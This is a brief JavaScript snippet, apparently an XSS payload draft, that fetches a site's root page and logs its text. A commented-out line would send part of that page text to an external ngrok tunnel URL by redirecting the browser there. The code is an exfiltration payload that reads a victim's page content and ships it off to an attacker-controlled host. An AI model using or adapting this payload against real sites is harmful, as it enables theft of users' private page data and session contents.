fetch("/").then(res => {
res.text().then(t => {
console.log(t)
  //window.location="https://76da-217-178-135-36.ngrok.io/"+encodeURI(t.slice(800))
})
})
